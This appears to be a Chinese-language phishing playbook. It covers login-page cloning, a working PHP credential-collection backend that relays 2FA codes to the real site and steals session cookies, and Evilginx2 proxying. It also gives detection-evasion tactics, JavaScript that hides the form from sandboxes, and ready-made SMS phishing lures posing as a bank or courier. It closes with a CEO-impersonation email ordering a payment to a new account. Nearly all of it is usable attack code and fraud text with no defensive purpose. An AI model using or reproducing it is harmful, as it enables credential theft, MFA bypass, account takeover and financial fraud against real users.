# 钓鱼落地页与凭据采集

## 登录页克隆

### 技术原理
1. wget/mirror 目标登录页
2. 修改表单 action 指向本地采集脚本
3. 保持原始 CSS/JS/图片引用（相对路径→绝对路径）
4. 添加 JavaScript 实时转发（2FA）

### 克隆流程
```bash
# wget 克隆
wget --mirror --convert-links --adjust-extension \
     --page-requisites --no-parent \
     https://login.target.com/

# 或用 httrack
httrack "https://login.target.com/" -O ./phishing_site

# 修改表单 action
sed -i 's|action="https://login.target.com/auth"|action="/collect.php"|g' ./phishing_site/index.html
```

### 凭据采集后端

```php
<?php
// collect.php — 凭据采集 + 2FA 转发
session_start();

// 记录所有 POST 数据
$data = $_POST;
$data['_ip'] = $_SERVER['REMOTE_ADDR'];
$data['_ua'] = $_SERVER['HTTP_USER_AGENT'];
$data['_time'] = date('Y-m-d H:i:s');
$data['_referer'] = $_SERVER['HTTP_REFERER'] ?? '';

// 写入日志
file_put_contents('creds.log', json_encode($data) . "\n", FILE_APPEND | LOCK_EX);

// 记录到 session
$_SESSION['creds'] = $data;

// 如果是第一步（用户名/密码），跳转到 2FA 页面
if (isset($data['username']) && isset($data['password'])) {
    header('Location: /2fa.html');
    exit;
}

// 如果是 2FA 步骤，实时转发到真实目标
if (isset($data['code'])) {
    // 实时用窃取的凭据登录真实目标
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://login.target.com/auth');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'username' => $_SESSION['creds']['username'],
        'password' => $_SESSION['creds']['password'],
        'code' => $data['code'],
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    $response = curl_exec($ch);

    // 提取 Set-Cookie（会话 token）
    preg_match_all('/Set-Cookie:\s*(.+)/', $response, $matches);
    $cookies = implode("\n", $matches[1]);

    // 保存会话
    file_put_contents('session.log', $cookies . "\n", FILE_APPEND);

    // 重定向到真实目标（用户无感知）
    header('Location: https://login.target.com/dashboard');
    exit;
}
?>
```

### 2FA 实时转发（Evilginx2 方式）

```bash
# Evilginx2 — 中间人钓鱼代理
# 自动代理登录流程，实时捕获凭据 + 2FA + 会话 cookie

evilginx2 -p phishlets

# phishlet 配置示例 (yaml)
# title: Target Phishlet
# domain: target-phish.com
# real_site: login.target.com
# ...完整配置见 Evilginx2 文档
```

## 反检测策略

### URL 扫描规避
- 使用合法域名（注册相似域名）
- 使用 CDN（Cloudflare/Fastly）隐藏源 IP
- 短链接 + 重定向链（bit.ly → your domain → phishing）
- 使用正规 TLS 证书（Let's Encrypt）

### 落地页反沙箱
```javascript
// 检测是否在沙箱中
function isSandbox() {
    // 检查无头浏览器
    if (navigator.webdriver) return true;
    // 检查窗口大小
    if (window.outerWidth < 100) return true;
    // 检查 CPU 核心
    if (navigator.hardwareConcurrency < 2) return true;
    // 检查内存
    if (navigator.deviceMemory < 2) return true;
    return false;
}

if (!isSandbox()) {
    // 显示真实钓鱼页面
    document.getElementById('login-form').style.display = 'block';
} else {
    // 显示无害页面
    window.location.href = '/404.html';
}
```

## 短信钓鱼模板

```
[银行名称] 尊敬的客户，您的账户存在异常登录，
请立即验证：http://bank-verify.com/auth
退订回T

[快递公司] 您的包裹无法投递，请确认地址：
http://express-update.com/address
24小时内有效
```

## BEC 话术模板

```
发件人: ceo@target-company.com (伪装CEO)
收件人: finance@target-company.com

主题: 紧急 - 供应商付款变更

张经理，

我正在外地出差，需要你立即处理一笔付款。

[供应商名] 要求更新银行账户信息，
请将原定付款转到以下账户：

银行：[银行名]
户名：[供应商名]
账号：[新账号]

金额：¥[金额]

这很紧急，请在今天下班前完成。
完成后请将回执发到此邮箱。

如有人询问，这是正常的账户变更。

[CEO 姓名]
[职位]
[公司名]
```
